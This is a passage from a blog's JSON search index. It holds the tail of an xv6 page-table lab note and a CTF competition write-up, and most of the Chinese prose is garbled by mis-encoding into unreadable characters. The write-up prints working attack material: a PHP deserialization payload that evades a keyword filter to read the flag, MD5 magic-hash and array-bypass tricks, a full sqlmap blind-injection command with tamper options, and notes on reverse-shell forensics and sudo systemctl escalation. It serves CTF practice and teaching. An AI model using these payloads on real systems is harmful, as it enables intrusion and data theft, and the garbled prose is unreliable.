çš„ç›¸å…³æ–‡æ¡£ï¼Œé‚ä½œç½¢ã€‚ Null pointer å–æ¶ˆæ˜ å°„ç”¨æˆ·è¿›ç¨‹çš„ç¬¬ä¸€ä¸ªé¡µé¢ï¼Œè¿™æ ·åœ¨å¼•ç”¨ç©ºæŒ‡é’ˆæ—¶å°±ä¼šå‡ºç°æ•…éšœã€‚æ‚¨å¿…é¡»ä¿®æ”¹ user.ldï¼Œä½¿ç”¨æˆ·text.æ®µä» 4096 å¼€å§‹ï¼Œè€Œä¸æ˜¯ä» 0 å¼€å§‹ã€‚\nä¸€å¼€å§‹æ„£æ˜¯æ²¡çœ‹æ‡‚å•¥æ„æ€ã€‚è¿˜æ˜¯å¾—å›åˆ°å†…å­˜å¸ƒå±€ä¸­ï¼Œtextæ®µæ˜¯æœ€ä½åœ°å€ä¹Ÿå°±æ˜¯ä»0å¼€å§‹çš„ã€‚å› æ­¤å½“å¼•ç”¨ç©ºæŒ‡é’ˆæ—¶ï¼ŒæŒ‡å‘çš„æ˜¯textæ®µä¸­çš„0åœ°å€ï¼Œå°±ä¸ä¼šæŠ¥é”™ï¼Œç•™ä¸‹å®‰å…¨éšæ‚£ã€‚ å› æ­¤éœ€è¦æŠŠæ•´ä¸ªå†…å­˜å¸ƒå±€å¾€åæŒªã€‚é¦–å…ˆä¿®æ”¹user.ld 1 2 3 4 5 6 7 8 //... SECTIONS { . = 0x1000; // å³4096 .text : { *(.text .text.*) } //... ç„¶åä¿®æ”¹kernel/proc.c:userinit()ä¸­çš„p-\u0026gt;trapframe-\u0026gt;epc = 0; å’Œkernel/vm.c:uvmfirst()ä¸­çš„Â mappages(pagetable, 0, PGSIZE, (uint64)mem, PTE_W|PTE_R|PTE_X|PTE_U); ç„¶åå°±æŠ¥é”™äº†ã€‚é‚£å’‹åŠå˜›ï¼Œè°ƒè¯•å‘—ã€‚ç„¶è€Œè°ƒä¸åˆ©ç´¢ï¼Œç­‰æˆ‘å­¦å®Œåé¢çš„å¿…ç§’æ­¤é¢˜ã€‚ Dirty page æ·»åŠ ä¸€ä¸ªç³»ç»Ÿè°ƒç”¨ï¼Œè¯¥è°ƒç”¨ä½¿ç”¨Â PTE_DÂ æŠ¥å‘Šè„é¡µã€‚\nå’ŒLab3-3å¤§åŒå°å¼‚ æ‰“ä¸ªåˆ†â‘§ usertestsè€—æ—¶å¥½å‡ åˆ†é’Ÿï¼Œè¿˜ä»¥ä¸ºæŠ¥é”™äº†ï¼Œå…¶å®æ˜¯æ­£å¸¸ç°è±¡ã€‚ ","date":"2024-01-30T00:00:00Z","image":"https://lonelyuan.github.io/p/xv6-pagetables/address_hud7b2782c39d1dccfcbaf0a73995d96b7_88238_120x120_fill_box_smart1_3.png","permalink":"https://lonelyuan.github.io/p/xv6-pagetables/","title":"XV6 Lab - PageTables"},{"content":"æ¥šæ…§æ¯ï¼Ÿé™¤æ™¦æ¯ï¼ ğŸ‘´å¤§çº¦çš„ç¡®å¾ˆä¹…æ²¡å†™è¿‡CTFç›¸å…³çš„åšå®¢äº†ã€‚å› ä¸ºæ‰“CTFå°±æ˜¯ä¸ºäº†å…¬è´¹æ—…æ¸¸ï¼Œä¸ºäº†å½³äºï¼Œä¸ºäº†å£ä¹ã€‚å½“ç„¶ï¼Œä¹Ÿå¯èƒ½æ˜¯å½³äºä¹Ÿæ²¡å½³äºåˆ°ï¼Œé¸¡æ¯›æ²¡æŒ£ç€ï¼Œè¿˜è¿˜æ‰£é’±äº†ã€‚\nä½†å½“ğŸ‘´çœ‹åˆ°å®ƒçš„åå­—çš„æ—¶å€™ï¼ŒğŸ‘´å°±çŸ¥é“è¿™æ˜¯ğŸ‘´ä¸€å®šè¦æ‰“çš„æ¯”èµ›ã€‚å› ä¸ºå¿«è¿‡å¹´äº†ï¼Œä¸­å›½äººä¼ ç»Ÿä¸Šè®²è¦é™¤ä¸€é™¤èº«ä¸Šçš„æ™¦æ°”ï¼ˆæ¯æ—¥å‰ç¥¥è¯1/1ï¼‰ã€‚æ‰€ä»¥â€œæ¥šæ…§æ¯â€è¿™ä¸ªåå­—ç¡®å®æœ‰ç´ è´¨ï¼Œæœ¬æ„æ˜¯æ¥šåœ°çš„æ™ºæ…§ï¼Œè¡¨ç¤ºæ¹–åŒ—çœèµ›ï¼›è°éŸ³ä¹Ÿå¯ä»¥è¡¨ç¤ºé™¤å»æ™¦æ°”ï¼Œè¿æ¥æ–°çš„ä¸€å¹´ã€‚å†³èµ›èµ›åœºä¸Šï¼Œæœç„¶æœ‰å·¥ä½œäººå‘˜é—®æˆ‘ä»¬çš„ç‰Œå­æ˜¯ä¸æ˜¯å°é”™äº†ï¼ŒğŸ‘´å°±æ˜¯ä¸ºäº†è¿™ç¢Ÿé†‹æ‰åŒ…çš„è¿™ç›˜é¥ºå­ã€‚\nå†²å‡ºè¥¿æµ·å²¸ Aidaip: è¿™æ¯”èµ›æ²¡ä»€ä¹ˆäººæŠ¥ï¼Œä¸€ä¸ªå­¦æ ¡èƒ½æŠ¥ä¸¤é˜Ÿï¼Œä½ çœ‹è¿™æ¯”èµ›åˆ†4ä¸ªç»„ï¼Œæ¯ä¸ªç»„éƒ½æ˜¯å‰9æœ‰é’±æ‹¿ï¼Œè¿™ä¸æ˜¯å»æ¡é’±ï¼Ÿ ğŸ‘´ä»¬ï¼šå»å»å» äºæ˜¯ğŸ‘´ä»¬ç»„ç»‡äº†ä¸€é˜Ÿæœ¬ç§‘ç”Ÿä¸€é˜Ÿç ”ç©¶ç”ŸæŠ¥åã€‚å½“å³ç«‹ä¸‹å†›ä»¤çŠ¶ï¼Œæœ¬ç§‘ç”Ÿæ‰“ä¸è¿‡ç ”ç©¶ç”Ÿï¼Œè®©äººå” ä¸€è¾ˆå­ã€‚\nç»„å§”ä¼šï¼šå†³èµ›å†åŠ 8æ”¯é˜Ÿä¼ï¼Œä¸€å…±9ä¸ªå¥–è°¢è°¢ã€‚å¦å¤–ä¸€ä¸ªå­¦æ ¡åªèƒ½è¿›ä¸€é˜Ÿå“¦~ Aidaip: ä»–ä¹‹å‰çš„å…¬å‘Šç»å¯¹ä¸æ˜¯è¿™æ ·å†™çš„ã€‚ è¿™ä¸‹ä¸å¾—ä¸æ‰“å†…æˆ˜äº†ã€‚\nåˆèµ›WP åˆèµ›æ²¡å•¥å¥½è¯´çš„ï¼Œä¼ ç»ŸCTFï¼Œéƒ½æ˜¯è€é»„å†äº†ã€‚\nWeb1 å®³æè¿™å‰ç«¯ç»•è¿‡å‘¢ï¼Œå®³æè¿™è€ƒwww.zipå‘¢ã€‚é‡Œé¢æ˜¯ç™½ç»™ååºåˆ—åŒ–ï¼Œç™½ç»™å‘½ä»¤æ‰§è¡Œã€‚\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 \u0026lt;?php class Flag { public $a; public $b; public function __construct() { $this-\u0026gt;a = \u0026#39;\u0026#39;; $this-\u0026gt;b = \u0026#39;\u0026#39;; } public function __destruct() { if (!preg_match(\u0026#34;/flag|system|php|cat|tac|shell|sort/i\u0026#34;, $this-\u0026gt;a) \u0026amp;\u0026amp; !preg_match(\u0026#34;/flag|system|php|cat|tac|shell|sort/i\u0026#34;, $this-\u0026gt;b)) { system($this-\u0026gt;a . \u0026#39; \u0026#39; . $this-\u0026gt;b); } else { echo \u0026#34;again?\u0026#34;; } } } $f = new Flag(); $f-\u0026gt;a = \u0026#34;a=c;b=at;c=/fl;d=ag.txt;\\$a\\$b \\$c\\$d\u0026#34;; $f-\u0026gt;b = \u0026#34;\u0026#34;; echo serialize($f); Web2 é‡Œé¢æ˜¯å“ˆå¸Œé•¿åº¦æ‹“å±•æ”»å‡»ï¼ŒğŸ‘´ä¸Šä¸€æ¬¡é‡è§è¿™ç©æ„è¿˜æ˜¯åœ¨ç¬¬ä¸€æ¬¡æ‰“å¸¦æ¯”èµ›çš„æ—¶å€™ã€‚\nä½†æ˜¯ğŸ‘´ä¸‹äº†ä»¨ç¯å¢ƒæ‰ä¸‹åˆ°å¥½ç”¨çš„å·¥å…·ã€‚ç„¶ååé¢èƒ½ä¸Šä¼ æ–‡ä»¶ï¼Œè¿˜è¯´æ–‡ä»¶åå·²å†™å…¥æ•°æ®åº“ã€‚ä½†æ˜¯é¢˜ç›®åå«uploadï¼Œä½ æ€»ä¸èƒ½è€ƒæ³¨å…¥å§ã€‚ç„¶åğŸ‘´å°±å»çœ‹miscäº†ã€‚\nç„¶åè¿˜çœŸæ˜¯ï¼Œsqlmapä¸€æŠŠæ¢­ã€‚å‚»é€¼é¢˜ï¼Œè¡€äºx1ã€‚\nçŸ¥è¯†ç‚¹æ€»ç»“ï¼š PHP:md5() ä¼ ç»ŸCTFè€ƒPHPå“ˆå¸Œå°±è¿™è€ä¸‰æ ·ï¼š\nå¼±ç±»å‹0eç»•è¿‡ï¼šmd5($a) == md5($b) \u0026amp;\u0026amp; $a != $b ç»å…¸æŸ¥è¡¨ 1 2 3 4 5 6 7 8 9 10 QNKCDZO 0e830400451993494058024219903391 240610708 0e462097431906509019562988736854 s878926199a 0e545993274517709034328855841020 s155964671a 0e342768416822451524974117254469 s214587387a 0e848240448830537924465865611904 å¼ºç±»å‹â€”â€”æ•°ç»„ç»•è¿‡: md5($a) === md5($b) \u0026amp;\u0026amp; $a !== $b ?a[]=a\u0026amp;b[]=b å¼ºç±»å‹â€”â€”MD5ç¢°æ’: md5($a) === md5($b) \u0026amp;\u0026amp; (string)$a !== (string)$b fastcollè„šæœ¬ä»“åº“ åŒæ ·é€‚ç”¨äºmd5('nmsl'.$a) === md5('nmsl'.$b) é•¿åº¦æ‹“å±•æ”»å‡»: å·²çŸ¥md5(a+b)å’Œlen(a)å’Œbï¼Œå¯ä»¥æ±‚md5(a+b+c)å’Œc hashpumpè„šæœ¬ä»“åº“ ç¢°æ’å’Œæ‹“å±•æ”»å‡»çš„æ—¶å€™æ³¨æ„æŠŠä¸å¯è§å­—ç¬¦è½¬urlencode Misc1 å¯¹ä¸€ä¸ªæ–‡ä»¶å‹ç¼©4097æ¬¡ã€‚å†™ä¸ªé€’å½’zipè§£å‹çš„è„šæœ¬ï¼Œgptç§’äº†ã€‚ä½†æ˜¯è¦å°å¿ƒgptçš„è„šæœ¬è·‘å®Œä¸€çœ‹å‡ åƒä¸ªå‹ç¼©åŒ…å¥½å‡ åGï¼Œä¸€ä¸ªé‡Œçº³ç±³ã€‚è§£å‡ºæ¥æ‘©æ–¯å¯†ç ï¼Œæ²¡æ„æ€ã€‚\nMisc2 æä¸€å†…å­˜é•œåƒï¼Œvolatilityä¸€æŠŠæ¢­ï¼Œæä¸€ä¸ªdocxé‡Œé¢æ˜¯ç©ºæ ¼å’Œtabï¼Œæ˜¯snowéšå†™ï¼Œå¯†ç æ˜¯é•œåƒé‡Œé¢çš„ç®¡ç†å‘˜å¯†ç ã€‚ğŸ‘´æ²¡è§è¿‡æè¿™çœ‹åŠå¤©8è¿›åˆ¶ï¼Œè¡€äºx2ã€‚\nMisc3 ç»™ä¸€ç‚¹é˜µå­—åº“æ–‡ä»¶ï¼Œå¯†æ–‡å°±æ˜¯ç‚¹é˜µåºåˆ—ã€‚å‡ºé¢˜äººæƒ³è®©æˆ‘ä»¬å»å­—åº“é‡ŒæŸ¥ï¼Œä½†æ˜¯æœ‰æ²¡æœ‰å¯èƒ½å¯ä»¥ç›´æ¥æ‰“å°ã€‚ç‚¹é˜µçš„æ ¼å¼æ˜¯ï¼š\n'0,0,960,1632,3120,3120,1632,960,1632,3120,3120,3120,1632,960,0,0' æ¯è¡Œ16ä¸ªæ•°ï¼Œæ¯ä¸ªæ•°ä¸å¤§äº4096ï¼Œä¹Ÿå°±æ˜¯16ä½2è¿›åˆ¶ï¼ŒåŠ èµ·æ¥å°±æ˜¯16*16çš„åƒç´ ç‚¹é˜µï¼Œæˆ‘ç›´æ¥è®©gptæ‰“å°ï¼š\n1 2 3 4 5 6 7 8 for data in lset: # å°†æ•°æ®æ‹†åˆ†æˆæ¯ä¸ªæ•°å­—çš„åˆ—è¡¨ numbers = [int(num) for num in data[0].split(\u0026#39;,\u0026#39;)] for num in numbers: # å°†æ¯ä¸ªæ•°å­—è½¬æ¢ä¸ºäºŒè¿›åˆ¶å­—ç¬¦ä¸²ï¼Œå¹¶åœ¨å·¦ä¾§è¡¥é›¶è‡³ 16 ä½ binary_str = format(num,\u0026#39;016b\u0026#39;) for i in range(0,16): # æ‰“å°æ¯è¡Œçš„åƒç´ çŠ¶æ€ pixel = \u0026#39;X\u0026#39; if binary_str[i] == \u0026#39;1\u0026#39; else \u0026#39; print(pixel,end=\u0026#39;\u0026#39;) print() æ‰“å‡ºæ¥å‘ç°åªæœ‰16ç§å­—ç¬¦ï¼Œä¹Ÿå°±æ˜¯16è¿›åˆ¶å’¯ã€‚è‚‰çœ¼å†™ä¸ªè¡¨åŒ¹é…å³å¯ã€‚\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 lset = [ [\u0026#39;0,0,960,1632,3120,3120,1632,960,1632,3120,3120,3120,1632,960,0,0\\n\u0026#39;,\u0026#39;8\u0026#39;], [\u0026#39;0,0,4080,4080,2096,96,192,192,384,384,768,768,768,768,0,0\\n\u0026#39;,\u0026#39;7\u0026#39;], [\u0026#39;0,0,224,96,96,96,2016,3168,3168,3168,3168,3168,2000,0,0,0\\n\u0026#39;,\u0026#39;d\u0026#39;], [\u0026#39;0,0,960,1632,3120,48,96,448,96,48,48,3120,1632,960,0,0\\n\u0026#39;,\u0026#39;3\u0026#39;], [\u0026#39;0,0,960,1632,3120,3072,3520,3680,3120,3120,3120,3120,1632,960,0,0\\n\u0026#39;,\u0026#39;6\u0026#39;], [\u0026#39;0,0,4080,3072,3072,3072,4032,3680,48,48,48,3120,1632,960,0,0\\n\u0026#39;,\u0026#39;5\u0026#39;], [\u0026#39;0,64,192,448,960,704,1728,3264,3264,6336,8176,192,192,480,0,0\\n\u0026#39;,\u0026#39;4\u0026#39;], [\u0026#39;0,0,992,1584,3096,3096,3096,3096,3096,3096,3096,3096,1584,992,0,0\\n\u0026#39;,\u0026#39;0\u0026#39;], [\u0026#39;0,0,128,896,384,384,384,384,384,384,384,384,384,960,0,0\\n\u0026#39;,\u0026#39;1\u0026#39;], [\u0026#39;0,0,0,0,0,0,1984,3168,96,2016,3168,3168,2008,0,0,0\\n\u0026#39;,\u0026#39;a\u0026#39;], [\u0026#39;0,0,0,0,0,0,992,3120,3072,3072,3072,3120,2016,0,0,0\\n\u0026#39;,\u0026#39;c\u0026#39;], [\u0026#39;0,0,960,1632,3120,3120,48,48,96,192,384,784,1552,4080,0,0\\n\u0026#39;,\u0026#39;2\u0026#39;], [\u0026#39;0,0,0,0,0,0,992,3120,3120,4080,3072,3120,2016,0,0,0\\n\u0026#39;,\u0026#39;e\u0026#39;], [\u0026#39;0,0,3584,1536,1536,1536,2016,1560,1560,1560,1560,1560,3056,0,0,0\\n\u0026#39;,\u0026#39;b\u0026#39;], [\u0026#39;0,0,960,1632,3120,3120,3120,3120,1648,1008,48,3120,1632,960,0,0\\n\u0026#39;,\u0026#39;9\u0026#39;], [\u0026#39;0,0,240,408,384,384,2016,384,384,384,384,384,960,0,0,0\\n\u0026#39;,\u0026#39;f\u0026#39;], ] ll = [i[0] for i in lset] ans = \u0026#34;\u0026#34; with open(\u0026#39;cipher.txt\u0026#39; ,\u0026#39;r\u0026#39; ) as f: l = f.readlines() for i in l: if i in ll: ans += lset[ll.index(i)][1] binary_data = bytes.fromhex(ans) with open(\u0026#34;output_file.zip\u0026#34;, \u0026#34;wb\u0026#34;) as file: file.write(binary_data) æœ€åæ˜¯ä¸ªzipï¼Œå‹ç¼©åŒ…å¯†ç ç»™hintäº†ï¼Œè¿˜æ˜¯ä¸ªäºŒè¿›åˆ¶ç‚¹é˜µï¼Œè¿˜æ˜¯ç›´æ¥æ‰“å°è‚‰çœ¼çœ‹ã€‚\nåˆèµ›æˆ˜æŠ¥ â€œä½†æ˜¯æˆ‘ä»¬çš„çƒè¿·ï¼Œä»–ä»¬ä¸ç¦»ä¸å¼ƒåœ°é™ªä¼´ç€å›½è¶³åˆ°æœ€åä¸€ç§’ï¼â€ï¼ˆé€’è¯ç­’ï¼‰\nåˆèµ›ç»“æœæ˜¯æœ¬ç§‘ç”Ÿæˆ˜é˜Ÿ1445åˆ†æ’¼è´Ÿç ”ç©¶ç”Ÿæˆ˜é˜Ÿ1448åˆ†ï¼ŒğŸ‘´é˜Ÿå‹çº¿è¿›å†³èµ›ï¼Œè¿™ä¸‹è®©äººå” ä¸€è¾ˆå­äº†ã€‚\nç„¶åç¬¬äºŒå¤©ï¼š\næœ¬ç§‘ğŸ‘´ï¼šç»„å§”ä¼šæ‰“ç”µè¯äº†ï¼ŒğŸ‘´ä»¬é€’è¡¥è¿›å†³èµ›äº† ğŸ‘´ï¼šÂ¿Â¿Â¿ å¤æ´»èµ›æ‰“èµ¢äº†ï¼Ÿ ç‰¢å¤§ï¼šæˆ‘æ²¡æ„è§ åäº†ï¼Œè¿™ä¸‹çœŸè®©ä»–ç»™å†²å‡ºæ¥äº†ã€‚è¿™ä¸‹å‡‘å¤Ÿäººæ¼”ã€Šæ­¦æ±‰å¾€äº‹ã€‹äº†ï¼Œä½ ä»¬å¸ˆå¾’ä¸‰äººï¼ˆæœ¬ç§‘ç”Ÿï¼‰å¯¹é˜µæˆ‘ä»¬å¸ˆå¾’ä¸‰äººï¼ˆç ”ç©¶ç”Ÿï¼‰ï¼Œæ­¦æ±‰ç­‰ä½ å—·ã€‚\næ­¦æ±‰å¾€äº‹ äºæ˜¯ğŸ‘´ä»¬æ¥åˆ°äº†NCCå›½å®¶ç½‘å®‰åŸºåœ°ï¼Œåç§‘ç¡®å®å¸…ï¼Œå®¿èˆ/é…’åº—ç¡®å®å¥½ï¼Œé£Ÿå ‚ç¡®å®è´µã€‚\nğŸ‘´ä¸€çœ‹å‚èµ›æ‰‹å†Œï¼Œæ‚¨çŒœæ€ä¹ˆç€ï¼Œä¸Šåˆæ‰“ä¸€ä¼ ç»ŸCTFï¼Œä¸‹åˆæ‹¿ä¸Šåˆçš„webå’Œpwné¢˜æ‰“fixï¼Œè¿˜åªæœ‰ä¸‰è½®ï¼Œè¿˜æ˜¯å®‰æ’å¹³å°ã€‚æˆ‘åªèƒ½è¯´ï¼Œä¸æä¾›check downè¿˜æ˜¯attack downçš„AWDpéƒ½æ˜¯çº¯çº¯çš„å¨ç”Ÿã€‚\nå†³èµ›WP æµé‡åˆ†æ è¿˜ä»¥ä¸ºè€ƒmiscï¼Œç»“æœåªå¤šè€ƒäº†æµé‡å’Œé€†å‘ã€‚ğŸ‘´é…äº†ä¸€æ™šä¸Šç¯å¢ƒï¼Œé¸¡æ¯›æ²¡ç”¨ä¸Šã€‚ğŸ‘´é˜Ÿå‹ä¹Ÿæ˜¯ï¼Œå¤œé‡Œçš„æ™ºæ…§å…¨éƒ¨æœ¨å¤§ã€‚æ—©çŸ¥é“å¥½å¥½ç¡ä¸€è§‰ã€‚\næ”»å‡»è€…ä½¿ç”¨çš„ç®¡ç†å‘˜è´¦æˆ·å’Œå¯†ç æ˜¯ä»€ä¹ˆ http.request.method == \u0026quot;POST\u0026quot; \u0026amp;\u0026amp; http.request.uri contains \u0026quot;login\u0026quot; æˆ–è€…ä»åå¾€å‰ç¿»ï¼Œæ‰¾åˆ°æ‰§è¡Œæ¶æ„ä»£ç çš„åœ°æ–¹ï¼Œå†å¾€å‰å°±æœ‰äº† æ”»å‡»è€…é€šè¿‡ä»€ä¹ˆæ–‡ä»¶æ³„éœ²çš„å¯†ç  æ‹¿åˆ°å¯†ç å¾€å‰æœå‘—ã€‚ctrl+Fï¼Œåˆ†ç»„å­—èŠ‚æµ-å­—ç¬¦ä¸²ï¼šTPShop6.0 æ”»å‡»è€…é€šè¿‡ä»€ä¹ˆæ–‡ä»¶ä¸Šä¼ çš„åé—¨ æ‹¿åˆ°å¯†ç å¾€åç¿»ï¼Œæ‰¾åˆ°ä¸€ä¸ªphtmlçš„æœ¨é©¬ï¼Œå†å¾€å‰ç¿»å°±æœ‰ä¸Šä¼ çš„æ¥å£ æ”»å‡»è€…å°†shellåå¼¹è‡³å…¬ç½‘IPï¼Œåå¼¹shellçš„IPå’Œç«¯å£æ˜¯ä»€ä¹ˆ ç»Ÿè®¡â†’IPv4 Statisticsâ†’All Adressesæ ¹æ®åˆ†ç»„æ•°é‡æ’åï¼Œå‰ä¸¤ä¸ªæ˜¯æœåŠ¡å™¨å’Œé»‘å®¢çš„å®¢æˆ·ç«¯ï¼Œç¬¬ä¸‰å¤šçš„IPæ˜¾ç„¶å°±æ˜¯åå¼¹çš„äº†å…¬ç½‘IPäº†ã€‚ ç„¶åè¿‡æ»¤tcpæµï¼Œå¯ä»¥çœ‹åˆ°æ˜æ–‡çš„bashæµé‡ï¼Œå¯¹åº”çš„ç«¯å£å°±æ˜¯äº† æ”»å‡»è€…ä½¿ç”¨ä»€ä¹ˆæ–‡ä»¶ææƒ é˜…è¯»tcpæµï¼Œçœ‹ä»–æ‰§è¡Œè¿‡ä»€ä¹ˆå‘½ä»¤å°±è¡Œäº†ã€‚å¤§ä¸äº†æŒ¨ä¸ªè¯•æ¯•ç«Ÿ50æ¬¡æœºä¼šã€‚ sudo /bin/systemctl status apache2.service å¯ä»¥çœ‹åˆ°sudoeræ–‡ä»¶é‡Œæä¾›äº†è¿™æ¡è¯­å¥çš„å…å¯†æ‰§è¡Œï¼Œæ—¢ç„¶æœ‰sudoé‚£å°±æ˜¯systemctläº† æ•´å¥—é¢˜éš¾åº¦ä¸é«˜ï¼Œèµ›åœºä¸Šå‰é¢çš„å¸¦ä½¬åŸºæœ¬ä¸Š1å°æ—¶ä»¥å†…akçš„ã€‚ğŸ‘´é˜Ÿè¿˜æ˜¯åœ¨ä¸Šé¢æµªè´¹äº†ç‚¹æ—¶é—´ã€‚å¯¼è‡´åé¢web2è„šæœ¬æ²¡å†™å®Œï¼Œè¡€äºx3ã€‚\nWeb1 ç®€å•çš„æ–‡ä»¶ä¸Šä¼ CURDï¼Œè¿‡æ»¤äº†phpæ ‡ç­¾ï¼Œä½†æ˜¯ğŸ‘´ç›´æ¥ä¼ \u0026lt;? phpinfo();?\u0026gt;å°±èƒ½æ‰§è¡Œã€‚\nfixé˜¶æ®µä¸€çœ‹ï¼Œæ‹¿includeè¯»æ–‡ä»¶å†…å®¹ï¼Œé‚£æ²¡äº‹äº†ã€‚\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 \u0026lt;?php //list.php $dir = __DIR__.\u0026#34;/uploads/\u0026#34;; $files = array_diff(scandir($dir), array(\u0026#34;.\u0026#34;, \u0026#34;..\u0026#34;)); $filename = $_GET[\u0026#39;filename\u0026#39;]; ///// æ¼æ´ä»£ç  // ob_start(); // å¯åŠ¨è¾“å‡ºç¼“å†² // include \u0026#34;$dir$filename\u0026#34;; // $fileContent = ob_get_contents(); // ob_end_clean(); // æ¸…ç©ºè¾“å‡ºç¼“å†² ///// ä¿®å¤ä»£ç  $fileContent = file_get_contents($dir.$filename); foreach ($files as $file) { if($filename !== $file){ continue; } $filePath = $dir . $file; $fileSize = filesize($filePath); // æ–‡ä»¶å¤§å° $fileType = mime_content_type($filePath); // æ–‡ä»¶ç±»å‹ $fileDetails[] = array( \u0026#39;fileContent\u0026#39;=\u0026gt;\u0026#39;data://\u0026#39;.$fileType.\u0026#39;,\u0026#39;.base64_encode($fileContent), \u0026#39;name\u0026#39; =\u0026gt; $file, \u0026#39;size\u0026#39; =\u0026gt; $fileSize, \u0026#39;type\u0026#39; =\u0026gt; $fileType, ); } echo json_encode($fileDetails); ?\u0026gt; ğŸ‘´ç›´æ¥æ‰¬æ‰includeï¼Œç„¶åç¬¬ä¸€è½®å°±å®•äº†ã€‚ğŸ‘´æ˜¯å‚»é€¼ï¼Œå…‰çŸ¥é“æ‰¬æ²¡æŠŠåŠŸèƒ½è¡¥å…¨ï¼Œè¡€äºx4ã€‚\nWeb2 sqlç›²æ³¨ï¼Œä½†æ˜¯fuzzäº†å¾ˆé•¿æ—¶é—´æ‰ç¡®å®šã€‚ç„¶åç›²æ³¨è„šæœ¬å°±å†™ä¸å®Œäº†ï¼Œå±äºæ˜¯ä¹‹å‰å­¦çš„éƒ½å¿˜å…‰äº†ã€‚\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 \u0026lt;?php error_log(0); if ($_SERVER[\u0026#34;REQUEST_METHOD\u0026#34;] == \u0026#34;POST\u0026#34;) { // è·å–ç”¨æˆ·è¾“å…¥çš„æœç´¢å…³é”®è¯ $search_query = strtolower($_POST[\u0026#34;search_query\u0026#34;]); /////// ä¿®å¤å¤§å°å†™ç»•è¿‡ $blocked_keywords = \u0026#34;/select|union|and|#|order| |by|or/\u0026#34;; // ä½¿ç”¨æ­£åˆ™è¡¨è¾¾å¼å®šä¹‰ä¸å…è®¸çš„å…³é”®å­—æ¨¡å¼ if (preg_match($blocked_keywords, $search_query)) { echo \u0026#34;hack!!!\u0026#34;; }else { // è¿æ¥åˆ°æ•°æ®åº“ï¼ˆè¯·æ ¹æ®ä½ çš„æ•°æ®åº“ä¿¡æ¯ä¿®æ”¹è¿™äº›å‚æ•°ï¼‰ $dbhost = \u0026#39;127.0.0.1\u0026#39;; $dbuser = \u0026#39;root\u0026#39;; $dbpass = \u0026#39;root\u0026#39;; $conn = mysqli_connect($dbhost, $dbuser, $dbpass, \u0026#39;ctf\u0026#39;); if(! $conn ) { die(\u0026#39;è¿æ¥å¤±è´¥: \u0026#39; . mysqli_error($conn)); } // æ‰§è¡Œæ•°æ®åº“æŸ¥è¯¢ $sql = \u0026#34;select * from images where id = \u0026#39;$search_query\u0026#39; LIMIT 0,1\u0026#34;; $result = $conn-\u0026gt;query($sql); if ($result-\u0026gt;num_rows \u0026gt; 0) { // è¾“å‡ºæŸ¥è¯¢ç»“æœ while ($row = $result-\u0026gt;fetch_assoc()) { // echo \u0026#34;\u0026lt;p\u0026gt;\u0026#34;.$row[\u0026#34;id\u0026#34;].\u0026#34;\u0026lt;/p\u0026gt;\u0026#34;; echo \u0026#39;\u0026lt;img src=\u0026#34;\u0026#39; . $row[\u0026#34;image_path\u0026#34;] . \u0026#39;\u0026#34; width=\u0026#34;200\u0026#34; height=\u0026#34;200\u0026#34;\u0026gt;\u0026lt;br\u0026gt;\u0026#39;; // ä»–æè¿™æ•…æ„è¿·æƒ‘ğŸ‘´æ˜¯å§ï¼Œå¥½ï¼Œé‚£ä¹ˆå¥½ } } else { echo \u0026#34;null\u0026#34;; } // å…³é—­æ•°æ®åº“è¿æ¥ $conn-\u0026gt;close(); } } ?\u0026gt; è¿™ä»£ç ä¸€çœ¼GPTï¼Œè¿‡æ»¤éšä¾¿åŠ ç‚¹strtolower()å’Œé»‘åå•å°±è¡Œã€‚\nçŸ¥è¯†ç‚¹æ€»ç»“ï¼šSQLmapè¿›é˜¶ åšä¸€ååˆæ ¼çš„é«˜çº§è„šæœ¬å°å­è¦å­¦ä¼šç”¨sqlmapçš„æ—¶å€™è‡ªå·±å†™tamperè„šæœ¬ã€‚å®é™…ä¸Šä¹Ÿå¾ˆç®€å•ï¼Œå¯¹ç…§ç°æˆçš„æ”¹æ”¹å°±æ˜¯äº†ã€‚\næœ¬é¢˜çš„sqlmapå‘½ä»¤ï¼š\npython3 ./sqlmap.py -u \u0026quot;localhost/search.php\u0026quot; -data=\u0026quot;search_query=*\u0026quot; --prefix \u0026quot;1' AND\u0026quot; --suffix \u0026quot;AND '1'='1\u0026quot; --technique=B --tamper=space2newline --dbs\n--prefix, --suffix: æŒ‡å®šæ³¨å…¥çš„å‰åç¼€ã€‚ é»˜è®¤æƒ…å†µä¸‹ï¼Œsqlmapä¼šä½¿ç”¨å‰é¢é—­åˆåé¢æ³¨é‡Šçš„æ‰‹æ³•ï¼Œwhich is dumbã€‚æ¯”å¦‚æœ¬é¢˜ä¸­æ³¨å…¥ç‚¹åæ–¹çš„çš„LIMITå­å¥å°±éœ€è¦å‰é¢çš„SELECTç¯å¢ƒã€‚è€Œæœ¬é¢˜ä¸­æ‰€æœ‰çš„æ³¨é‡Šæ–¹æ³•éƒ½ä¸å¥½ä½¿ã€‚\nå› æ­¤ï¼Œæ‰‹æ³¨çš„æ—¶å€™é¦–å…ˆé—­åˆå‡ºä¸€å—å®Œæ•´çš„è¯­æ³•ç¯å¢ƒï¼Œç„¶åäº¤ç»™sqlmapã€‚åœ¨æ­¤é¢˜ä¸­é—­åˆçš„è¯­å¥æ˜¯ï¼š\nselect * from images where id = '1' AND {sub_query} AND '1'='1' LIMIT 0,1\n--technique=B: {sub_query}è¢«å¤¹åœ¨andä¸­é—´ï¼Œå› æ­¤ä½œä¸ºä¸€ä¸ªå¸ƒå°”è¡¨è¾¾å¼ä½¿ç”¨å¸ƒå°”ç›²æ³¨ï¼ŒæŒ‡å®šå‚æ•°ä½¿sqlmapä¸è¦æµªè´¹æ—¶é—´è¿›è¡Œåˆ«çš„æµ‹è¯•ã€‚æ‰€æœ‰æ³¨å…¥æŠ€æœ¯ç±»å‹å¦‚ä¸‹ï¼š 1 2 3 4 5 6 Bï¼šå¸ƒå°”å‹ç›²æ³¨ï¼ˆBoolean-based blindï¼‰ Eï¼šæŠ¥é”™å‹æ³¨å…¥ï¼ˆError-basedï¼‰ Uï¼šè”åˆæŸ¥è¯¢æ³¨å…¥ï¼ˆUNION query-basedï¼‰ Sï¼šå †å 